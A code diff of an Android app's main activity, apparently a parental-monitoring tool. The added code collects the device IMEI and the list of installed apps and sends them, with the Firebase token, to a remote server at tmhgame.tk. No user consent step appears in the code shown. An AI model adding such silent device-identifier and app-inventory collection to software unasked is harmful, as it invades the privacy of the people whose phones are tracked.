@@ -22,6 +22,7 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.content.pm.ResolveInfo;
 import android.content.pm.ServiceInfo;
 import android.database.Cursor;
 import android.graphics.drawable.Drawable;
@@ -66,6 +67,7 @@ import com.google.android.gms.tasks.Task;
 import com.google.firebase.iid.FirebaseInstanceId;
 import com.google.firebase.iid.InstanceIdResult;
 
+import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
@@ -90,21 +92,20 @@ public class MainActivity extends FragmentActivity {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
+//        try {
+//            checkFolder();
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
+//        try {
+//            new FileR().write("locations.txt", "123.1231:123.3213", true);
+//        } catch (IOException e) {
+//            e.printStackTrace();
+//        }
+
         try {
-            checkFolder();
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        try {
-            new FileR().write("locations.txt", "123.1231:123.3213", true);
-        } catch (IOException e) {
-            e.printStackTrace();
-        }
-        try {
-            Drawable icon = this.getPackageManager().getApplicationIcon("com.google.android.youtube");
-            String ans = new Util().bitMaptoString(icon);
-            Logger.l(ans);
-        } catch (PackageManager.NameNotFoundException | IOException e) {
+            firstTimeInit();
+        } catch (JSONException e) {
             e.printStackTrace();
         }
 
@@ -114,6 +115,7 @@ public class MainActivity extends FragmentActivity {
 
         Logger.l(new Device().getImei(this));
         startMainService();
+
 
 
         FirebaseInstanceId.getInstance().getInstanceId()
@@ -138,6 +140,9 @@ public class MainActivity extends FragmentActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
             AppActivityService.getStatus(this);
         }
+
+        startActivity(new Intent(MainActivity.this, ParentActivity.class));
+        this.finish();
     }
 
     public void startMainService() {
@@ -173,7 +178,7 @@ public class MainActivity extends FragmentActivity {
         try {
             postData.put("t", token);
             postData.put("i", imei);
-            new ServerHelper().execute("http://tmhgame.tk/fbt", postData.toString());
+            new ServerHelper(this).execute("http://tmhgame.tk/updateFirebaseToken", postData.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -188,7 +193,7 @@ public class MainActivity extends FragmentActivity {
             postData.put("location", "location.getText().toString()");
             postData.put("type", "type.getText().toString()");
             postData.put("deviceID", "deviceID.getText().toString()");
-        new ServerHelper().execute("http://tmhgame.tk/fbt", postData.toString());
+        new ServerHelper(this).execute("http://tmhgame.tk/uploadIcon", postData.toString());
         } catch (JSONException e) {
             e.printStackTrace();
         }
@@ -206,6 +211,24 @@ public class MainActivity extends FragmentActivity {
     protected void onActivityResult(int requestCode, int resultCode, Intent data) {
         super.onActivityResult(requestCode, resultCode, data);
         permissionManager.activityResult(requestCode);
+    }
+
+
+    public void firstTimeInit() throws JSONException {
+        Intent mainIntent = new Intent(Intent.ACTION_MAIN, null);
+        mainIntent.addCategory(Intent.CATEGORY_LAUNCHER);
+        List<ResolveInfo> pkgAppsList = this.getPackageManager().queryIntentActivities( mainIntent, 0);
+        JSONObject O = new JSONObject();
+        JSONArray a = new JSONArray();
+        //O.put("array", )
+
+        for(ResolveInfo x : pkgAppsList) {
+            a.put(x.activityInfo.packageName);
+        }
+        O.put("apps", a);
+        O.put("imei", new Device().getImei(this));
+        new ServerHelper(this).execute("http://tmhgame.tk/initApp", O.toString());
+        Logger.l(O.toString());
     }
 
 
